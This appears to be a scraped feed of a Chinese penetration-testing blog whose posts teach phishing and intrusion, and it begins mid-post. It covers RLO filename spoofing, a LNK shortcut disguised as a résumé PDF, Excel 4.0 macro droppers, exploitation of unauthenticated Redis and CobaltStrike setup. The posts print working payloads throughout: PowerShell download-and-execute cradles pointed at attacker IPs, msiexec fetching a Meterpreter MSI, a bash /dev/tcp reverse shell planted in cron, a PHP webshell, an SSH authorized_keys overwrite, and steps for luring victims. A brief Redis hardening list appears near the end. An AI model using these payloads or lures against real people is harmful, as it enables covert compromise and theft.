Office和WPS中还可以隐藏文字，可以利用该方式通过配合录制宏的方法，用该方式执行… Normal模块下，不止能编写一个settings.xml.rels…可以多宏… 弹框执行代码写入宏，那么Excel、PPT等也写… 不止docx宏，还有很多，能另存文件内容的都可以… 四、参考链接 https://www.cnblogs.com/zzjdbk/p/14435769.html https://blog.csdn.net/qq_34801745/article/details/111307768 https://cloud.tencent.com/developer/article/1799424","categories":[{"name":"APT/社工","slug":"APT-社工","permalink":"https://wolke.cn/categories/APT-%E7%A4%BE%E5%B7%A5/"}],"tags":[{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://wolke.cn/tags/CobaltStrike/"},{"name":"钓鱼","slug":"钓鱼","permalink":"https://wolke.cn/tags/%E9%92%93%E9%B1%BC/"},{"name":"社工","slug":"社工","permalink":"https://wolke.cn/tags/%E7%A4%BE%E5%B7%A5/"},{"name":"APT","slug":"APT","permalink":"https://wolke.cn/tags/APT/"}],"author":"w01ke"},{"title":"RLO的Unicode反转文件后缀钓鱼","slug":"RLO的Unicode反转文件后缀钓鱼","date":"2022-03-07T10:10:22.000Z","updated":"2022-03-08T02:21:11.891Z","comments":true,"path":"post/5653cc29.html","link":"","permalink":"https://wolke.cn/post/5653cc29.html","excerpt":"","text":"一、初体验Unicode（中文：万国码、国际码、统一码、单一码）是计算机科学领域里的一项业界标准。它对世界上大部分的文字系统进行了整理、编码，使得电脑可以用更为简单的方式来呈现和处理文字。而如上技术正是使用了Unicode的RLO（开始从左向右覆盖），Unicode定义的 Start of right-to-left override，控制字符是RLO，ASCII码是0x3F。只要在一行字符前面加上一个0x3F就可以实现文本的反向排列。这个0x3F是Unicode为了兼容阿拉伯文字从左至右的阅读习惯设计的一个转义字符。 大致原理就是，在Windows下面，支持一种特殊的Unicode字符RLO，一个字符串中如果有这个字符，那么在Windows下显示时，就会把RLO右侧的字符串逆序显示出来 例如，原始字符串：abcd[RLO]efgh，在Windows下显示为：abcdhgfe，攻击者可以利用这个特性，把exe文件伪装成一个文本或图片文件，用户在双击时恶意文件便得到执行。 【示例】 我们新建一个txt.bat内容为start calc.exe，点击重命名选择插入Unicode控制字符，选择RLO此时文件名称会变为tab.txt 二、结合使用CobaltStrike1、生成监听器 2、生成powershell木马 powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.4.13.124:80/a&#x27;))&quot; 3、使用BAT2EXE将BAT转换为EXE将以下内容保存为test.bat powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.4.13.124:80/a&#x27;))&quot; 下载安装BAT2EXE，打开该工具，点击open导入前面创建的test.bat，然后将“notepad”添加到test.bat的顶部，点击右侧的icon选择一个txt文本图标。然后将exe格式更改为“64位Windows（隐形）”，以防止在目标用户打开文件时弹出任何终端，最后点击convert转换 保存为txt.bat 4、RLO伪装EXE后缀为TXT 5、反弹shell下面的动图，展示了打开一个TXT钓鱼文件时，逼真的打开了记事本，然后在背后悄悄的上了线： 三、附录 各种图标ico下载 命令行的BAT2EXE下载 图形化的BAT2EXE下载 四、参考链接 https://cloud.tencent.com/developer/article/1799424 https://blog.csdn.net/mgxcool/article/details/50637346 https://www.freebuf.com/articles/network/320964.html https://blog.csdn.net/qq_23452385/article/details/109145151","categories":[{"name":"APT/社工","slug":"APT-社工","permalink":"https://wolke.cn/categories/APT-%E7%A4%BE%E5%B7%A5/"}],"tags":[{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://wolke.cn/tags/CobaltStrike/"},{"name":"钓鱼","slug":"钓鱼","permalink":"https://wolke.cn/tags/%E9%92%93%E9%B1%BC/"},{"name":"社工","slug":"社工","permalink":"https://wolke.cn/tags/%E7%A4%BE%E5%B7%A5/"},{"name":"APT","slug":"APT","permalink":"https://wolke.cn/tags/APT/"}],"author":"w01ke"},{"title":"lnk快捷方式钓鱼","slug":"lnk快捷方式钓鱼","date":"2022-02-28T11:19:00.000Z","updated":"2022-03-08T02:48:11.653Z","comments":true,"path":"post/1cb9d074.html","link":"","permalink":"https://wolke.cn/post/1cb9d074.html","excerpt":"","text":"一、前言lnk文件是用于指向其他文件的一种文件。这些文件通常称为快捷方式文件，通常它以快捷方式放在硬盘上，以方便使用者快速的调用。 lnk钓鱼主要将图标伪装成正常图标，但是目标会执行shell命令。 二、初体验找到计算器所在目录，创建快捷方式 下图为calc.exe的快捷方式的属性信息，我们可以在“目标”栏写入自己的恶意命令，如powershell上线命令 这里以使用cmd调用计算器为例 C:\\Windows\\System32\\cmd.exe /c calc.exe# cmd /c 命令 执行完命令后关闭命令窗口# cmd /k 命令 执行完命令后不关闭命令窗口 此时点击点击该快捷方式，黑框一闪就弹出计算器 三、图标问题而在实施钓鱼过程中，对于我们的calc.exe的快捷方式来说，一个大大的计算机ico图标，显然看起来不像一个好玩意，因此可以尝试在“属性”中去更改该文件的图标： 图标文件路径：%SystemRoot%\\System32\\shell32.dll 随便选一个后，如下所示 但是用系统自带的ico去做文件图标替换的话，有个弊端，即当替换的ico在目标机器上不存在时，就会出现类似空白ico图标： 用010 Editor打开该LNK文件，找到String Data部分ICON_LOCATION字符串 根据crazyman师傅所说，修改lnk的icon_location标志位，修改为相关后缀，系统即可⾃动联想到对应的打开⽅式。 具体原理参考：https://bbs.pediy.com/thread-260953.htm 我们要将其修改为.\\1.pdf(Unicode)，其长度0x07： 保存修改后，此时calc.exe的快捷方式图标为PDF的了 ⽐如我的pdf默认是由edge浏览器打开，则在icon_location中设置为pdf后缀时，⽂件的ico也会自动显示为edge浏览器打开的图标， 这样可以达到⾃适配的效果 四、进阶伪装当受害者中招打开我们的所谓的pdf，实则为恶意的快捷方式时，双击两下，什么反应都没有，可能会有一丝疑惑，因此可以当尝试用powershell、mshta等方式上线时，我们可以更改如cobaltstrike生成的代码，加上一段自动下载打开一份真的pdf，来达到逼真的效果。 五、使用cobaltstrike1、创建监听器这里就创建给Beacon HTTP 2、生成后门代码 powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.1.105:80/a&#x27;))&quot;[+] -nop：NoProfile，使用此参数阻止PowerShell在开机时加载配置文件脚本，以避免载入非预期的命令或设置[+] -w：WindowStyle，将窗口样式设置为 Normal、Minimized、Maximized 或 Hidden。[+] -c：Command，执行指定的命令(和任何参数)[+] IEX (New-Object Net.WebClient).DownloadString(&#x27;#&#123;remote_script&#125;&#x27;); 该命令将#&#123;remote_script&#125;加载到内存，并没有把该脚本下载到本地[+] Iex命令为invove-expression的别名：接收一个字符串作为要运行的完整命令（包括参数）。 3、创建快捷方式lnk文件首先要知道PowerShell.exe目录：C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\ 创建快捷方式，在对象的位置将目录和木马代码拼接起来 C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.1.105:80/a&#x27;))&quot; 命名为简历.pdf 4、修改图标任意选择%systemroot%\\system32\\shell32.dll的一个图标 使用上面的方法，更改为PDF自适配 5、初级反弹shell用户双击做好的简历.pdf，即可反弹shell 6、使用真正的PDF文件伪装当受害者中招打开我们的所谓的pdf，实则为恶意的快捷方式时，双击两下，什么反应都没有，可能会有一丝疑惑，因此可以当尝试用powershell、mshta等方式上线时，我们可以更改如cobaltstrike生成的代码，加上一段自动下载打开一份真的pdf，来达到逼真的效果。 在简历.pdf的对象位置中，可以更改代码为如下 C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c &quot;(new-object net.webclient).DownloadFile(&#x27;http://192.168.1.105:8081/简历.pdf&#x27;,&#x27;$env:TEMP\\简历.pdf&#x27;);cd $env:TEMP;./简历.pdf;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.1.105:80/a&#x27;))&quot; 但是有个问题，就是上面的代码太长了，放不下 也尝试使用变量来代替地址或者new-object net.webclient，但是都出现了许多报错问题，折腾了一个下午都没搞定（后续会继续探索解决方案） 因此这里就使用通过下载PS脚本，通过执行脚本来进行 eval.ps1部署在Kali下，内容为 C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c &quot;(new-object net.webclient).DownloadFile(&#x27;http://192.168.1.105:8081/简历.pdf&#x27;,&#x27;$env:TEMP\\简历.pdf&#x27;);cd $env:TEMP;./简历.pdf;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.1.105:80/a&#x27;))&quot; 目标改为 方法一测试无反应：C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -w hidden -nop -NonI IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.1.105:8081/eval.ps1&quot;)方法二测试成功：C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy bypass -nop -w hidden -c &quot;(new-object net.webclient).DownloadFile(&#x27;http://192.168.1.105:8081/eval.ps1&#x27;,&#x27;$env:TEMP\\eval.ps1&#x27;);cd $env:TEMP;./eval.ps1&quot; 7、使用真正PDF伪装了的反弹shell下面的动图，展示了打开一个快捷方式钓鱼文件时，逼真的打开了真实的简历，然后在背后悄悄的上了线： 六、参考链接 https://security.tencent.com/index.php/blog/msg/165 https://bbs.pediy.com/thread-260953.htm https://blog.csdn.net/qq_28808697/article/details/103036894","categories":[{"name":"APT/社工","slug":"APT-社工","permalink":"https://wolke.cn/categories/APT-%E7%A4%BE%E5%B7%A5/"}],"tags":[{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://wolke.cn/tags/CobaltStrike/"},{"name":"钓鱼","slug":"钓鱼","permalink":"https://wolke.cn/tags/%E9%92%93%E9%B1%BC/"},{"name":"社工","slug":"社工","permalink":"https://wolke.cn/tags/%E7%A4%BE%E5%B7%A5/"},{"name":"APT","slug":"APT","permalink":"https://wolke.cn/tags/APT/"}],"author":"w01ke"},{"title":"Redis安全","slug":"Redis安全","date":"2022-02-22T14:00:11.000Z","updated":"2022-03-10T04:17:54.724Z","comments":true,"path":"post/472fbc5b.html","link":"","permalink":"https://wolke.cn/post/472fbc5b.html","excerpt":"","text":"一、Redis介绍Redis（Remote Dictionary Server）译为“远程字典服务”，它是一款基于内存实现的键值型 NoSQL 数据库， 通常也被称为数据结构服务器，这是因为它可以存储多种数据类型，比如 string（字符串），hash（哈希散列），list（列表），set（集合）和 sorted set（有序集合）等。 可以对内存中的数据直接存取，也可以写到硬盘中去。默认端口为6379 Nosql数据库的特点是： 容易扩展：NoSQL数据库种类繁多，但是一个共同的特点都是去掉关系数据库的关系型特性。数据之间无关系，这样就非常容易扩展。无形之间，在架构的层面上带来了可扩展的能力。 大数据量、高性能：NoSQL数据库都具有非常高的读写性能，尤其在大数据量下，同样表现优秀。这得益于它的无关系性，数据库的结构简单。 一般MySQL使用Query Cache。NoSQL的Cache是记录级的，是一种细粒度的Cache，所以NoSQL在这个层面上来说性能就要高很多。 灵活的数据模型：NoSQL无须事先为要存储的数据建立字段，随时可以存储自定义的数据格式。而在关系数据库里，增删字段是一件非常麻烦的事情。如果是非常大数据量的表，增加字段简直就是——个噩梦。这点在大数据量的Web 2.0时代尤其明显。 高可用：NoSQL在不太影响性能的情况，就可以方便地实现高可用的架构。比如Cassandra、HBase模型，通过复制模型也能实现高可用。 nosql数据库种类繁多，但是它们都有一个共同的特点，就是它们都去掉了关系数据库的关系型特性，使用键值型 二、Ubuntu部署Redis1、下载和安装我这里使用的是Ubuntu进行下载 wget http://download.redis.io/releases/redis-4.0.9.tar.gz 解压 tar zxvf redis-4.0.9.tar.gz 移动解压后的文件夹到/usr/local/redis目录下 sudo mv ./redis-4.0.9 /usr/local/redis 进入到/usr/local/redis目录下，make test编译一下 make test 报错了，执行以下命令即可 make distclean &amp;&amp; make 错误的本质是我们在开始执行make 时遇到了错误（大部分是由于gcc未安装），然后我们安装好了gcc 后，我们再执行make ,这时就出现了jemalloc/jemalloc.h: No such file or directory。这是因为上次的编译失败，有残留的文件，我们需要清理下，然后重新编译就可以了。 提示以下信息说明没问题了 再次执行 make test ​ 大概8分钟左右的编译后，出现绿色字体的信息，说明没问题 进入/usr/local/redis/src目录下，看到有以下命令，说明的确没问题了，编译安装成功 # 方便找到sudo mkdir /etc/redis sudo cp /usr/local/redis/redis.conf /etc/redis/ 2、修改配置文件修改并保存配置文件 3、运行Redis服务端以/etc/redis/redis.conf的配置文件启动Redis服务端 ./redis-server /etc/redis/redis.conf 查看是否开启Redis ps aux | grep redis 4、客户端连接服务端./redis-cli -h 192.168.1.117 可以看到，当保存了数据后，src目录下会有dump.rdb，看一下可以大概知道，这应该存储了当时我们创建的键值对（当然，如果通过cp命令将redis-server加入到/usr/bin目录下，那么在当前目录下运行的redis，那么就会在当前目录下生成dump.rdb，不一定在src目录下） 这里可以知道，默认情况下，连接Redis是无需密码的，因此日常可以会因为管理员疏忽而存在Redis未授权登录的问题（用Telnet也可以连接 telnet IP port） 因为官方说明save默认保存的是rdb文件，redis-bits?@?ctime就是rdb标识符，实战可以把它看成脏数据 三、Kali安装Redis-cli1、下载安装wget http://download.redis.io/redis-stable.tar.gz 解压 tar -zxvf redis-stable.tar.gz 可以看到有个makefile，直接make，全局生效 2、加入环境变量sudo cp redis-cli /usr/bin 3、连接Ubuntu的Redis服务redis-cli -h 192.168.1.117 四、设置密码登录之前说过，默认情况下Redis是免密登陆的，那么就存在未授权登录的风险。那么如何设置密码登录呢？ 打开配置文件，配置密码为haha123，如图所示 requirepass haha123 关闭Redis服务 shutdownps aux | grep redis 启动Redis服务 redis-server /etc/redis/redis.confps aux | grep redis 客户端连接 auth [username] password或者直接redis-cli -h [ip] -a [password] 五、常见命令 命令 描述 info 查看信息 flushall 删除所有数据库内容 flushdb 刷新数据库 KEYS * 查看所有键,使用 select num 可以查看键值数据 set test “who am i” 设置变量 config set dir dirpath 设置路径等配置 save 保存 get 变量 查看变量名称 六、相关漏洞因配置不当可以未经授权访问，攻击者无需认证就可以访问到内部数据，其漏洞可导致敏感信息泄露（Redis服务器存储一些有趣的session、cookie或商业数据可以通过get枚举键值），也可以恶意执行flushall来清空所有数据，攻击者还可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件。如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接免密码登录服务器，其相关漏洞信息如下： 1、Redis 远程代码执行漏洞(CVE-2016-8339)Redis 3.2.x &lt; 3.2.4版本存在缓冲区溢出漏洞，可导致任意代码执行。Redis数据结构存储的CONFIG SET命令中client-output-buffer-limit选项处理存在越界写漏洞。构造的CONFIG SET命令可导致越界写，代码执行。 2、CVE-2015-8080Redis 2.8.x在2.8.24以前和3.0.x 在3.0.6以前版本，lua_struct.c中存在getnum函数整数溢出，允许上下文相关的攻击者许可运行Lua代码（内存损坏和应用程序崩溃）或可能绕过沙盒限制意图通过大量，触发基于栈的缓冲区溢出。 3、CVE-2015-4335Redis 2.8.1之前版本和3.0.2之前3.x版本中存在安全漏洞。远程攻击者可执行eval命令利用该漏洞执行任意Lua字节码 4、CVE-2013-7458读取“.rediscli_history”配置文件信息 七、Redis写文件1、写入Webshell只要知道 web 绝对路径并且权限足够就可以写个 webshell 192.168.1.117:6379&gt; CONFIG SET dir /usr/share/apache/htdocs/ #这里是站点绝对路径（我这里Ubuntu没有安装中间件，只作为演示参考）OK 192.168.1.117:6379&gt; set shell &quot;&lt;?php echo system($_REQUEST[cmd]);?&gt;&quot; OK192.168.1.117:6379&gt; CONFIG SET dbfilename shell.php OK192.168.1.117:6379&gt; save #将内存中的数据保存到dbfilename中 OK MISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on disk。 如果报错无法向磁盘写入rdb，尝试将stop-writes-on-bgsave-error设置为no，如config set stop-writes-on-bgsave-error no 2、计划任务启动反弹shell在 linux 系的系统有着定时任务的功能，只要文件可以写到定时任务目录里就可以执行系统命令。 （1）命令初测试Kali开启nc监听 Ubuntu执行命令 bash -i &gt;&amp; /dev/tcp/192.168.236.129/9999 0&gt;&amp;1 ​ 此时成功反弹shell到nc 命令是没有问题的 （2）/var/spool/cron/用户名 测试192.168.1.117:6379&gt; pingPONG192.168.1.117:6379&gt; config set dir /var/spool/cron/ //每个用户生成的crontab文件，都会放在 /var/spool/cron/ 目录下面OK192.168.1.117:6379&gt; set haha &quot;\\n\\n\\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.105/9999 0&gt;&amp;1\\n\\n\\n&quot; // 直接往当前用户的crontab里写入反弹shell，换行是必不可少的。每分钟尝试连接OK192.168.1.117:6379&gt; config set dbfilename rootOK192.168.1.117:6379&gt; save(error) ERR192.168.1.117:6379&gt; save(error) ERR192.168.1.117:6379&gt; get haha&quot;\\n\\n\\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.105/9999 0&gt;&amp;1\\n\\n\\n&quot; 192.168.1.117:6379&gt; saveOK192.168.1.117:6379&gt; 之所以会保存错误是因为当前用户对该文件夹没有写权限，为了实验效果修改再次保存即可 这里也引起反思，实战中碰到这样的问题该怎么办？ 检验无错误 cron计划任务服务也已经开启 systemctl status cron 但此时nc却迟迟未收到反弹shell 注意：有些系统对 crontab 的文件内容的校验比较严格可能会导致无法执行定时任务。 按照一个前辈的说法就是Ubuntu的计划任务，前面有乱码它将无法执行。而如果换成CentOs就可以，因为CentOs可以跳过乱码，执行正确的能执行的计划任务代码。这里因为我未部署CentOs虚拟机，就当作我反弹成功了，后续有机会再补上CentOs 一个师傅总结的一些定时计划目录 /var/spool/cron/用户名/var/spool/cron/crontabs/用户名/etc/crontab/etc/cron.d/xxx ​ 看了上面才知道，原来当初设置数据库名字为root是对root用户，而这里我的用户名是xdd，因此重新设置一下 nc依然没有收到shell，嗯！这样实验才有说服力，的确是Ubuntu的问题 （3）开发不常用计划任务根据一个师傅的说法，如果尝试以上面这种方法写bash反弹，会导致覆盖原来有的crontab计划任务，因此极其不推荐直接写到/var/spool/cron，一旦运维在crontab中配置了一些脚本启动，盲目的覆盖，会对业务产生极大的破坏 正确的做法是：选择一个开发不常用的计划任务 以centos7为例子 对应的含义如下：每天/每日/每小时/每月/每周 可以写文件到/etc/cron.hourly/ 可以覆盖0anacron文件 or 创建一个可执行的sh文件 覆盖0anacron，正常情况下，没人会在这里写计划任务，可以覆盖它： 创建可执行sh文件，如下所示： 这样就不会覆盖文件，比较保险 3、写SSH key利用前提 Redis 服务器运行在 root 用户下（否则还要猜测用户） 此服务器对外开启了 ssh 服务 Redis 未授权访问漏洞 Linux 系统使用 ssh 的用户目录下都会有一个隐藏文件夹/.ssh/。比如我这里用户是 只要把我们的公钥写在对方的 .ssh/authorized_keys 文件里再去用 ssh 连接就不需服务器的账号密码了 开始实验！ 由于我Ubuntu的xdd用户目录下没有.ssh文件，那就自己创建一下 ssh-keygen -t rsa Kali的id_rsa.pub，这是Kali的公钥 将公钥信息写入到key.txt中 (echo -e &quot;\\n\\n&quot;;cat id_rsa.pub;echo -e &quot;\\n\\n&quot;) &gt; key.txt 将xxx键的值设置为key.txt的内容 cat key.txt | redis-cli -h 192.168.1.117 -a haha123 -x set xxx 将攻击者的公钥文件覆盖写入到用户的authorized_keys中 config set dir /home/xdd/.sshconfig set dbfilename authorized_keyssave 如果本来就有authorized_keys文件，那么将会被新的覆盖 ​ 此时用户那边有我们攻击者的公钥文件，攻击者就可以使用私钥免密ssh登录到用户的主机上 ssh -i /home/kali/.ssh/id_rsa xdd@192.168.1.117 八、Redis攻击思路（1）内网端口扫描 nmap -v -n -Pn -p 6379 -sV --scriptredis-info 192.168.56.1/24 （2）通过文件包含读取配置文件 （3）Redis配置文件中一般会设置明文密码，在进行渗透哦时可以通过webshell查看其配置文件，Redis往往不止一台计算机，可以利用其来进行内网渗透，或者扩展权限渗透 （4）使用Redis暴力破解工具 https://github.com/evilpacket/redis-sha-crack，其命令为： node ./redis-sha-crack.js -w wordlist.txt -s shalist.txt 127.0.0.1 host2.example.com:5555 需要安装node： git clone https://github.com/nodejs/node.git chmod -R 755 nodecd node./configuremake （5）msf下利用模块 auxiliary/scanner/redis/file_upload normal Redis File Uploadauxiliary/scanner/redis/redis_login normal Redis Login Utilityauxiliary/scanner/redis/redis_server normal Redis Command Execute Scanner 九、Redis漏洞挖掘 对“port: 6379”进行搜索：https://www.zoomeye.org/searchResult?q=port:6379 除去显示“-NOAUTH Authentication required.”的结果，显示这个信息表示需要进行认证，也即需要密码才能访问。 https://fofa.so/ 关键字检索：port=&quot;6379&quot; &amp;&amp; protocol==redis &amp;&amp; country=CN 十、Redis基本安全策略 端口修改为其他端口（默认为6379） requirepass设置复杂的密码 最好不要用Root用户去启动Redis，而是单独为Redis设置一个账号 设置本地localhost不允许外部访问，这样就不能让攻击者去爆破Redis的连接密码 开启保护模式protected-mode（默认开启） 检测Key，通过本地登录，通过“keys *”命令查看，如果有入侵则其中会有很多的值 linux下需要检查authorized_keys：Redis内建了名为crackit的key，也可以是其它值，同时Redis的conf文件中dir参数指向了/root/.ssh，/root/.ssh/authorized_keys 被覆盖或者包含Redis相关的内容，查看其值就可以直到是否被入侵过 检查authorized_keys是否非法，如果已经被修改，则可以重新生成并恢复，不能使用修改过的文件。并重启ssh服务（service ssh restart） 对网站进行webshell扫描和分析：发现利用Redis账号漏洞的，则在shell中会存在Redis字样。 修改conf文件禁止全网访问，打开6379.conf文件，找到bind0.0.0.0前面加上# （禁止全网访问） 【可参考加固修改命令】 命令 描述 port 修改redis使用的默认端口 bind 设定redis监听的专用IP requirepass 设定redis连接的密码 rename-command CONFIG “” 禁用CONFIG命令 rename-command info info2 重命名info为info2 十一、参考链接 https://paper.seebug.org/1169/ https://www.cnblogs.com/piaomiaohongchen/p/15892170.html https://www.freebuf.com/column/170710.html","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"Redis","slug":"Redis","permalink":"https://wolke.cn/tags/Redis/"}],"author":"w01ke"},{"title":"Excel宏钓鱼","slug":"Excel宏钓鱼","date":"2022-02-21T15:34:35.000Z","updated":"2022-02-28T11:29:42.952Z","comments":true,"path":"post/5cb87fce.html","link":"","permalink":"https://wolke.cn/post/5cb87fce.html","excerpt":"","text":"一、前言Excel一般指Microsoft Office Excel。这里就不用多说了，它跟office一样都是支持宏的，所以一样存在宏病毒。当我们把恶意的宏代码嵌入Excel中，用户打开Excel文件里的宏就会被触发，然后拿到对方电脑权限，并进行控制。 二、环境介绍 三、Excel宏躲避杀软检测1、制作msi恶意文件利用msfvenom生成msi恶意后门文件，这里还有很多方法可以生成msi，免杀也可以在这里开始进行！ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.43.167 lport=4444 -f msi -o w01ke.msi 2、建立监听msf6 &gt; use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &gt; set lhost 192.168.43.167lhost =&gt; 192.168.43.167msf6 exploit(multi/handler) &gt; set lport 4444lport =&gt; 4444msf6 exploit(multi/handler) &gt; exploit -j # 持续监听 3、开启Web服务python -m SimpleHTTPServer 8081 4、制作excel宏首先在windwos环境利用excel创建一个.xlsx的文件！ 创建好后双击打开，并在左下角右键点击sheet，然后点击插入！ 选择MS Excel 4.0宏表…. 然后在左上角第一个格子输入： =EXEC(&quot;msiexec /q /i http://192.168.43.167:8081/w01ke.msi&quot;) # 调用执行服务器上的w01ke.msi文件[+] /i 指定正常安装。[+] /q 静默安装 ​ 第二个格子输入 =HALT() # 表示Excel 4.0宏结束，类似C语言return指令 点击一下A（代表选中第一列），然后将左上角的A1模式手动输入：Auto_Open，Enter回车即可！ 为了避免对方打开能看到宏文件，以及增强隐蔽性，将宏进行隐藏！ 保存为xlsm文件格式 5、引诱用户下载和启用恶意宏文件通过社工等手段，引诱用户下载eval.xlsm文件，打开文件并且启用宏 6、反弹shell 四、参考链接 https://www.freebuf.com/articles/web/258797.html","categories":[{"name":"社工","slug":"社工","permalink":"https://wolke.cn/categories/%E7%A4%BE%E5%B7%A5/"}],"tags":[{"name":"钓鱼","slug":"钓鱼","permalink":"https://wolke.cn/tags/%E9%92%93%E9%B1%BC/"},{"name":"社工","slug":"社工","permalink":"https://wolke.cn/tags/%E7%A4%BE%E5%B7%A5/"},{"name":"APT","slug":"APT","permalink":"https://wolke.cn/tags/APT/"}],"author":"w01ke"},{"title":"CobaltStrike安装及基本使用与内网渗透","slug":"CobaltStrike安装及详细使用","date":"2022-02-16T17:26:19.000Z","updated":"2022-03-09T04:48:47.906Z","comments":true,"path":"post/57d03e3e.html","link":"","permalink":"https://wolke.cn/post/57d03e3e.html","excerpt":"","text":"一、CobaltStrike简介CobaltStrike是一款渗透测试神器，被业界人称为CS神器。CobaltStrike分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。 CobaltStrike集成了端口转发、服务扫描，自动化溢出，多模式端口监听，windows exe 木马生成，windows dll 木马生成，java 木马生成，office 宏病毒生成，木马捆绑。钓鱼攻击包括：站点克隆，目标信息获取，java 执行，浏览器自动攻击等等强大的功能！ Cobalt Strike 主要用于团队作战，可谓是团队渗透神器，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。 Cobalt Strike 作为一款协同APT工具，针对内网的渗透测试和作为apt的控制终端功能，使其变成众多APT组织的首选。 二、CobaltStrike的安装和启动我这里以Kali为例 1、安装java环境这里我用的是jdk-8u191-linux-x64.tar.gz，下载链接参照：https://blog.csdn.net/DeweyLau/article/details/109636906 注意：java并不是必须要安装到opt目录下，读者可以自行选择 上传到Kali中，解压：tar -xzvf jdk-8u191-linux-x64.tar.gz移动到opt目录下： mv jdk1.8.0_191/ /opt/进入jdk目录：cd /opt/jdk1.8.0_191执行 vim ~/.bashrc 并添加下列内容# install JAVA JDKexport JAVA_HOME=/opt/jdk1.8.0_191export CLASSPATH=.:$&#123;JAVA_HOME&#125;/libexport PATH=$&#123;JAVA_HOME&#125;/bin:$PATH保存退出执行: source ~/.bashrc执行：update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_191/bin/java 1update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_191/bin/javac 1update-alternatives --set java /opt/jdk1.8.0_191/bin/javaupdate-alternatives --set javac /opt/jdk1.8.0_191/bin/javac查看结果：update-alternatives --config javaupdate-alternatives --config javac 出现上图情况说明安装成功 2、安装CobalStrike上传到Kali中，解压：unzip cobaltstrike-linux.zip进入cobalstrike中：cd cobaltstrike-linux/ 一般Cobalt Strike目录结构如下： [+] agscript 拓展应用的脚本[+] c2lint 用于检查profile的错误异常[+] teamserver 服务端程序[+] cobaltstrike，cobaltstrike.jar 客户端程序(java跨平台)[+] license.pdf 许可证文件[+] logs 目录记录与目标主机的相关信息 [+] update，update.jar 用于更新CS [+] third-party 第三方工具 将安装目录解压进入目录后，可以给所有文件赋予777权限 chmod 777 ./* 3、启动服务端团队服务器最好运行在Linux平台上，服务端的关键文件是teamserver和cobaltstrike.jar，将这两个文件放在同一目录下运行： ./teamserver &lt;host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD]&lt;host&gt; 必需参数 团队服务器IP&lt;password&gt; 必需参数 连接服务器的密码[/path/to/c2.profile] 可选参数 指定C2通信配置文件，体现其强大的扩展性[YYYY-MM-DD] 可选参数 所有payload的终止时间# 启动Team Serversudo ./teamserver [当前开启服务端设备的IP地址] [客户端登录密码] # 设置强密码，否则容易被爆破，参考附录 比如这里我的Kali是部署在内网的，IP地址是192.168.1.104，设置客户端的登录密码为123456 sudo ./teamserver 192.168.1.104 123456 PS：团队服务器默认连接端口为50050，如果你想修改端口只需修改teamserver文件 如果运行上述命令出现以下报错信息 [-] keytool is not in $PATH install the Java Developer Kit 明明java已经安装好了，但是一直报错，于是马上检查 keytool 路径，突然发现 keytool 指向的路径是错误的，于是重新配置了一波路径，成功解决 sudo ln -s /opt/jdk1.8.0_191/bin/keytool /usr/bin/ 确定 java 路径，我的是 /opt/jdk1.8.0_191/bin/keytool 于是用上面的命令创建一条软链接。 注意：如果安装java时跟我安装的不同，上面的路径改成你们当时安装的路径即可 如果提示已存在，可以用 rm -rf ./keytool 命令删除重建 4、客户端连接Linux：**./cobaltstrike**或**java -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar** Windows：双击**cobaltstrike.exe** 输入服务端IP，端口默认50050，用户名任意，密码为之前设置的密码，点击connect。第一次连接会出现hash校验，这里的hash等于前面的启动teamserver时的hash，直接点击“是”即可连接到团队服务器上。 三、参数详解1、Cobalt Strike[+] New Connection # 新建连接，支持连接多个服务器端[+] Preferences # 设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录[+] Visualization # 主要展示输出结果的视图[+] VPN Interfaces # 设置VPN接口[+] Listenrs # 创建监听器[+] Script Manager # 脚本管理，可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等[+] Close # 退出连接 2、View[+] Applications # 显示受害主机的应用信息[+] Credentials # 显示所有以获取的受害主机的凭证，如hashdump、Mimikatz[+] Downloads # 查看已下载文件[+] Event Log # 主机上线记录以及团队协作聊天记录[+] Keystrokes # 查看键盘记录结果[+] Proxy Pivots # 查看代理模块[+] Screenshots # 查看所有屏幕截图[+] Script Console # 加载第三方脚本以增强功能 [+] Targets # 显示所有受害主机[+] Web Log # 所有Web服务的日志 3、Attacks（1）Packages[+] HTML Application # 生成(executable/VBA/powershell)这三种原理实现的恶意HTA木马文件[+] MS Office 